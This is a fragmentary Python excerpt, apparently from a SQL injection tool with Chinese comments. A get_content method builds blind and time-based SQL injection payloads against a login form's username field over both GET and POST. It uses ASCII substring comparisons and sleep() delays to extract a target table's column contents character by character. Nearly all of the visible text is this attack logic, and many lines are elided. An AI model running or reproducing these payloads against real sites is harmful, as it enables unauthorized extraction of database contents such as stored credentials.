    ...
    def get_content(self, result, database_name, table_name, column_name, limits):
        ...
        if self.sqlirequest == "GET":
            ...
            if self.sqlimethod == "normal":
                ...
                # 然后注content 的 length
                for j in trange(100, desc="Column sqli...", leave=False, disable=True):
                ...
                for j in trange(int(content_len), desc='%dth Column sqli' % (limits + 1), leave=False, disable=True):
                ...
                for j in range(0, int(content_len)):
                    for k in range(30, 130):
                        payload = "username=admi' or SELECT if((SELECT  ascii(substring(" + column_name + "," + repr(
                            j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                            limits) + ",1) > " + repr(
                            k) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
        ...
        # 然后是post
            ...
            if self.sqlimethod == "normal":
                ...
                for j in range(0, int(content_len)):
                    for k in range(30, 130):
                        payload = {
                            "username": "admi' or SELECT if((SELECT  ascii(substring(" + column_name + "," + repr(
                                j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
        ...
        if self.sqlirequest == "GET":
            ...
            if self.sqlimethod == "normal":
                ...
                for j in range(0, 30):
                    payload = "username=admi' or SELECT if((SELECT length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
                        limits) + ",1) > " + repr(
                        j) + ",sleep(" + self.time + "),0)%23&passwd=ddog123&submit=Log+In"
        ...
        # 然后是post
            ...
            if self.sqlimethod == "normal":
                ...
                for j in range(0, int(content_len)):
                    for k in range(30, 130):
                        payload = {
                            "username": "admi' or select (SELECT ascii(substring(" + column_name + "," + repr(
                                j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                                limits) + ",1) >" + repr(k) + "))%23", "passwd": "ddog123"}
                        if self.Data.PostBuildData(payload, self.len) == 0:
                            content += chr(int(k))
                ...
                for j in range(0, int(content_len)):
                    for k in range(30, 130):
                        payload = {
                            "username": "admi' or SELECT if((SELECT  ascii(substring(" + column_name + "," + repr(
                                j + 1) + ",1)) from " + database_name + "." + table_name + " limit " + repr(
                                limits) + ",1) > " + repr(k) + ",sleep(" + self.time + "),0)%23",
                            "passwd": "ddog123"}
